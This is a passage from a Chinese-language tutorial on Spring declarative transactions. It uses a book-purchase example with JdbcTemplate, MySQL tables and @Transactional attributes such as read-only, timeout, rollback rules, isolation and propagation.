class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.31<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="②创建jdbc-properties-1"><a href="#②创建jdbc-properties-1" class="headerlink" title="②创建jdbc.properties"></a>②创建jdbc.properties</h4><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdbc.user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">jdbc.password</span>=<span class="string">atguigu</span></span><br><span class="line"><span class="attr">jdbc.url</span>=<span class="string">jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC</span></span><br><span class="line"><span class="attr">jdbc.driver</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure><h4 id="③配置Spring的配置文件-1"><a href="#③配置Spring的配置文件-1" class="headerlink" title="③配置Spring的配置文件"></a>③配置Spring的配置文件</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--扫描组件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.atguigu.spring.tx.annotation&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 导入外部属性文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置数据源 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;druidDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 配置 JdbcTemplate --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;jdbcTemplate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 装配数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;druidDataSource&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="④创建表"><a href="#④创建表" class="headerlink" title="④创建表"></a>④创建表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `t_book` (</span><br><span class="line">    `book_id` int(11) NOT NULL AUTO_INCREMENT COMMENT &#x27;主键&#x27;,</span><br><span class="line">    `book_name` varchar(20) DEFAULT NULL COMMENT &#x27;图书名称&#x27;,</span><br><span class="line">    `price` int(11) DEFAULT NULL COMMENT &#x27;价格&#x27;,</span><br><span class="line">    `stock` int(10) unsigned DEFAULT NULL COMMENT &#x27;库存（无符号）&#x27;,</span><br><span class="line">    PRIMARY KEY (`book_id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;</span><br><span class="line">insert into `t_book`(`book_id`,`book_name`,`price`,`stock`) values (1,&#x27;斗破苍穹&#x27;,80,100),(2,&#x27;斗罗大陆&#x27;,50,100);</span><br><span class="line">CREATE TABLE `t_user` (</span><br><span class="line">    `user_id` int(11) NOT NULL AUTO_INCREMENT COMMENT &#x27;主键&#x27;,</span><br><span class="line">    `username` varchar(20) DEFAULT NULL COMMENT &#x27;用户名&#x27;,</span><br><span class="line">    `balance` int(10) unsigned DEFAULT NULL COMMENT &#x27;余额（无符号）&#x27;,</span><br><span class="line">    PRIMARY KEY (`user_id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;</span><br><span class="line">insert into `t_user`(`user_id`,`username`,`balance`) values (1,&#x27;admin&#x27;,50);</span><br></pre></td></tr></table></figure><h4 id="⑤创建组件"><a href="#⑤创建组件" class="headerlink" title="⑤创建组件"></a>⑤创建组件</h4><p>创建BookController：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookService bookService;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buyBook</span><span class="params">(Integer bookId, Integer userId)</span>&#123;</span><br><span class="line">        bookService.buyBook(bookId, userId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口BookService：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">buyBook</span><span class="params">(Integer bookId, Integer userId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建实现类BookServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">BookService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookDao bookDao;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buyBook</span><span class="params">(Integer bookId, Integer userId)</span> &#123;</span><br><span class="line">        <span class="comment">//查询图书的价格</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">price</span> <span class="operator">=</span> bookDao.getPriceByBookId(bookId);</span><br><span class="line">        <span class="comment">//更新图书的库存</span></span><br><span class="line">        bookDao.updateStock(bookId);</span><br><span class="line">        <span class="comment">//更新用户的余额</span></span><br><span class="line">        bookDao.updateBalance(userId, price);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建接口BookDao：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BookDao</span> &#123;</span><br><span class="line">    Integer <span class="title function_">getPriceByBookId</span><span class="params">(Integer bookId)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">updateStock</span><span class="params">(Integer bookId)</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">updateBalance</span><span class="params">(Integer userId, Integer price)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建实现类BookDaoImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BookDaoImpl</span> <span class="keyword">implements</span> <span class="title class_">BookDao</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getPriceByBookId</span><span class="params">(Integer bookId)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select price from t_book where book_id = ?&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.queryForObject(sql, Integer.class, bookId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateStock</span><span class="params">(Integer bookId)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update t_book set stock = stock - 1 where book_id = ?&quot;</span>;</span><br><span class="line">        jdbcTemplate.update(sql, bookId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateBalance</span><span class="params">(Integer userId, Integer price)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;update t_user set balance = balance - ? where user_id =?&quot;</span>;</span><br><span class="line">            jdbcTemplate.update(sql, price, userId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-2、测试无事务情况"><a href="#4-3-2、测试无事务情况" class="headerlink" title="4.3.2、测试无事务情况"></a>4.3.2、测试无事务情况</h3><h4 id="①创建测试类"><a href="#①创建测试类" class="headerlink" title="①创建测试类"></a>①创建测试类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class="line"><span class="meta">@ContextConfiguration(&quot;classpath:tx-annotation.xml&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TxByAnnotationTest</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookController bookController;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testBuyBook</span><span class="params">()</span>&#123;</span><br><span class="line">        bookController.buyBook(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②模拟场景"><a href="#②模拟场景" class="headerlink" title="②模拟场景"></a>②模拟场景</h4><p>用户购买图书，先查询图书的价格，再更新图书的库存和用户的余额</p><p>假设用户id为1的用户，购买id为1的图书</p><p>用户余额为50，而图书价格为80</p><p>购买图书之后，用户的余额为-30，数据库中余额字段设置了无符号，因此无法将-30插入到余额字段</p><p>此时执行sql语句会抛出SQLException</p><h4 id="③观察结果"><a href="#③观察结果" class="headerlink" title="③观察结果"></a>③观察结果</h4><p>因为没有添加事务，图书的库存更新了，但是用户的余额没有更新</p><p>显然这样的结果是错误的，购买图书是一个完整的功能，更新库存和更新余额要么都成功要么都失败</p><h3 id="4-3-3、加入事务"><a href="#4-3-3、加入事务" class="headerlink" title="4.3.3、加入事务"></a>4.3.3、加入事务</h3><h4 id="①添加事务配置"><a href="#①添加事务配置" class="headerlink" title="①添加事务配置"></a>①添加事务配置</h4><p>在Spring的配置文件中添加配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    开启事务的注解驱动</span></span><br><span class="line"><span class="comment">    通过注解@Transactional所标识的方法或标识的类中所有的方法，都会被事务管理器管理事务</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- transaction-manager属性的默认值是transactionManager，如果事务管理器bean的id正好就</span></span><br><span class="line"><span class="comment">是这个默认值，则可以省略这个属性 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:annotation-driven</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>注意：导入的名称空间需要 <strong>tx</strong> <strong>结尾</strong>的那个。</p><p><img src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/post-blog/ssm/28.png"></p><h4 id="②添加事务注解"><a href="#②添加事务注解" class="headerlink" title="②添加事务注解"></a>②添加事务注解</h4><p>因为service层表示业务逻辑层，一个方法表示一个完成的功能，因此处理事务一般在service层处理</p><p>在BookServiceImpl的buybook()添加注解@Transactional</p><h4 id="③观察结果-1"><a href="#③观察结果-1" class="headerlink" title="③观察结果"></a>③观察结果</h4><p>由于使用了Spring的声明式事务，更新库存和更新余额都没有执行</p><h3 id="4-3-4、-Transactional注解标识的位置"><a href="#4-3-4、-Transactional注解标识的位置" class="headerlink" title="4.3.4、@Transactional注解标识的位置"></a>4.3.4、@Transactional注解标识的位置</h3><p>@Transactional标识在方法上，咋只会影响该方法</p><p>@Transactional标识的类上，咋会影响类中所有的方法</p><h3 id="4-3-5、事务属性：只读"><a href="#4-3-5、事务属性：只读" class="headerlink" title="4.3.5、事务属性：只读"></a>4.3.5、事务属性：只读</h3><h4 id="①介绍-1"><a href="#①介绍-1" class="headerlink" title="①介绍"></a>①介绍</h4><p>对一个查询操作来说，如果我们把它设置成只读，就能够明确告诉数据库，这个操作不涉及写操作。这样数据库就能够针对查询操作来进行优化。</p><h4 id="②使用方式"><a href="#②使用方式" class="headerlink" title="②使用方式"></a>②使用方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(readOnly = true)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buyBook</span><span class="params">(Integer bookId, Integer userId)</span> &#123;</span><br><span class="line">    <span class="comment">//查询图书的价格</span></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">price</span> <span class="operator">=</span> bookDao.getPriceByBookId(bookId);</span><br><span class="line">    <span class="comment">//更新图书的库存</span></span><br><span class="line">    bookDao.updateStock(bookId);</span><br><span class="line">    <span class="comment">//更新用户的余额</span></span><br><span class="line">    bookDao.updateBalance(userId, price);</span><br><span class="line">    <span class="comment">//System.out.println(1/0);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③注意"><a href="#③注意" class="headerlink" title="③注意"></a>③注意</h4><p>对增删改操作设置只读会抛出下面异常：</p><p>Caused by: java.sql.SQLException: Connection is read-only. Queries leading to data modification</p><p>are not allowed</p><h3 id="4-3-6、事务属性：超时"><a href="#4-3-6、事务属性：超时" class="headerlink" title="4.3.6、事务属性：超时"></a>4.3.6、事务属性：超时</h3><h4 id="①介绍-2"><a href="#①介绍-2" class="headerlink" title="①介绍"></a>①介绍</h4><p>事务在执行过程中，有可能因为遇到某些问题，导致程序卡住，从而长时间占用数据库资源。而长时间占用资源，大概率是因为程序运行出现了问题（可能是Java程序或MySQL数据库或网络连接等等）。</p><p>此时这个很可能出问题的程序应该被回滚，撤销它已做的操作，事务结束，把资源让出来，让其他正常程序可以执行。</p><p>概括来说就是一句话：超时回滚，释放资源。</p><h4 id="②使用方式-1"><a href="#②使用方式-1" class="headerlink" title="②使用方式"></a>②使用方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(timeout = 3)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buyBook</span><span class="params">(Integer bookId, Integer userId)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查询图书的价格</span></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">price</span> <span class="operator">=</span> bookDao.getPriceByBookId(bookId);</span><br><span class="line">    <span class="comment">//更新图书的库存</span></span><br><span class="line">    bookDao.updateStock(bookId);</span><br><span class="line">    <span class="comment">//更新用户的余额</span></span><br><span class="line">    bookDao.updateBalance(userId, price);</span><br><span class="line">    <span class="comment">//System.out.println(1/0);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③观察结果-2"><a href="#③观察结果-2" class="headerlink" title="③观察结果"></a>③观察结果</h4><p>执行过程中抛出异常：</p><p>org.springframework.transaction.<strong>TransactionTimedOutException</strong>: Transaction timed out:</p><p>deadline was Fri Jun 04 16:25:39 CST 2022</p><h3 id="4-3-7、事务属性：回滚策略"><a href="#4-3-7、事务属性：回滚策略" class="headerlink" title="4.3.7、事务属性：回滚策略"></a>4.3.7、事务属性：回滚策略</h3><h4 id="①介绍-3"><a href="#①介绍-3" class="headerlink" title="①介绍"></a>①介绍</h4><p>声明式事务默认只针对运行时异常回滚，编译时异常不回滚。</p><p>可以通过@Transactional中相关属性设置回滚策略</p><ul><li>rollbackFor属性：需要设置一个Class类型的对象</li><li>rollbackForClassName属性：需要设置一个字符串类型的全类名</li><li>noRollbackFor属性：需要设置一个Class类型的对象</li><li>rollbackFor属性：需要设置一个字符串类型的全类名</li></ul><h4 id="②使用方式-2"><a href="#②使用方式-2" class="headerlink" title="②使用方式"></a>②使用方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(noRollbackFor = ArithmeticException.class)</span></span><br><span class="line"><span class="comment">//@Transactional(noRollbackForClassName = &quot;java.lang.ArithmeticException&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">buyBook</span><span class="params">(Integer bookId, Integer userId)</span> &#123;</span><br><span class="line">    <span class="comment">//查询图书的价格</span></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">price</span> <span class="operator">=</span> bookDao.getPriceByBookId(bookId);</span><br><span class="line">    <span class="comment">//更新图书的库存</span></span><br><span class="line">    bookDao.updateStock(bookId);</span><br><span class="line">    <span class="comment">//更新用户的余额</span></span><br><span class="line">    bookDao.updateBalance(userId, price);</span><br><span class="line">    System.out.println(<span class="number">1</span>/<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="③观察结果-3"><a href="#③观察结果-3" class="headerlink" title="③观察结果"></a>③观察结果</h4><p>虽然购买图书功能中出现了数学运算异常（ArithmeticException），但是我们设置的回滚策略是，当</p><p>出现ArithmeticException不发生回滚，因此购买图书的操作正常执行</p><h3 id="4-3-8、事务属性：事务隔离级别"><a href="#4-3-8、事务属性：事务隔离级别" class="headerlink" title="4.3.8、事务属性：事务隔离级别"></a>4.3.8、事务属性：事务隔离级别</h3><h4 id="①介绍-4"><a href="#①介绍-4" class="headerlink" title="①介绍"></a>①介绍</h4><p>数据库系统必须具有隔离并发运行各个事务的能力，使它们不会相互影响，避免各种并发问题。一个事</p><p>务与其他事务隔离的程度称为隔离级别。SQL标准中规定了多种事务隔离级别，不同隔离级别对应不同</p><p>的干扰程度，隔离级别越高，数据一致性就越好，但并发性越弱。</p><p>隔离级别一共有四种：</p><ul><li>读未提交：READ UNCOMMITTED</li></ul><p>允许Transaction01读取Transaction02未提交的修改。</p><ul><li>读已提交：READ COMMITTED、</li></ul><p>要求Transaction01只能读取Transaction02已提交的修改。</p><ul><li>可重复读：REPEATABLE READ</li></ul><p>确保Transaction01可以多次从一个字段中读取到相同的值，即Transaction01执行期间禁止其它</p><p>事务对这个字段进行更新。</p><ul><li>串行化：SERIALIZABLE</li></ul><p>确保Transaction01可以多次从一个表中读取到相同的行，在Transaction01执行期间，禁止其它</p><p>事务对这个表进行添加、更新、删除操作。可以避免任何并发问题，但性能十分低下。</p><p>各个隔离级别解决并发问题的能力见下表：</p><table><thead><tr><th><strong>隔离级别</strong></th><th><strong>脏读</strong></th><th><strong>不可重复读</strong></th><th><strong>幻读</strong></th></tr></thead><tbody><tr><td>READ UNCOMMITTED</td><td>有</td><td>有</td><td>有</td></tr><tr><td>READ COMMITTED</td><td>无</td><td>有</td><td>有</td></tr><tr><td>REPEATABLE READ</td><td>无</td><td>无</td><td>有</td></tr><tr><td>SERIALIZABLE</td><td>无</td><td>无</td><td>无</td></tr></tbody></table><p>各种数据库产品对事务隔离级别的支持程度：</p><table><thead><tr><th><strong>隔离级别</strong></th><th><strong>Oracle</strong></th><th><strong>MySQL</strong></th></tr></thead><tbody><tr><td>READ UNCOMMITTED</td><td>×</td><td>√</td></tr><tr><td>READ COMMITTED</td><td>√(默认)</td><td>√</td></tr><tr><td>REPEATABLE READ</td><td>×</td><td>√(默认)</td></tr><tr><td>SERIALIZABLE</td><td>√</td><td>√</td></tr></tbody></table><h4 id="②使用方式-3"><a href="#②使用方式-3" class="headerlink" title="②使用方式"></a>②使用方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Transactional(isolation = Isolation.DEFAULT)</span><span class="comment">//使用数据库默认的隔离级别</span></span><br><span class="line"><span class="meta">@Transactional(isolation = Isolation.READ_UNCOMMITTED)</span><span class="comment">//读未提交</span></span><br><span class="line"><span class="meta">@Transactional(isolation = Isolation.READ_COMMITTED)</span><span class="comment">//读已提交</span></span><br><span class="line"><span class="meta">@Transactional(isolation = Isolation.REPEATABLE_READ)</span><span class="comment">//可重复读</span></span><br><span class="line"><span class="meta">@Transactional(isolation = Isolation.SERIALIZABLE)</span><span class="comment">//串行化</span></span><br></pre></td></tr></table></figure><h3 id="4-3-9、事务属性：事务传播行为"><a href="#4-3-9、事务属性：事务传播行为" class="headerlink" title="4.3.9、事务属性：事务传播行为"></a>4.3.9、事务属性：事务传播行为</h3><h4 id="①介绍-5"><a href="#①介绍-5" class="headerlink" title="①介绍"></a>①介绍</h4><p>当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。例如：方法可能继续在现有事务中运行，也可能开启一个新事务，并在自己的事务中运行。</p><h4 id="②测试"><a href="#②测试" class="headerlink" title="②测试"></a>②测试</h4><p>创建接口CheckoutService：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CheckoutService</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">checkout</span><span class="params">(Integer[] bookIds, Integer userId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建实现类CheckoutServiceImpl：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CheckoutServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">CheckoutService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BookService bookService;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="comment">//一次购买多本图书</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">checkout</span><span class="params">(Integer[] bookIds, Integer userId)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Integer bookId : bookIds) &#123;</span><br><span class="line">            bookService.buyBook(bookId, userId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在BookController中添加方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span 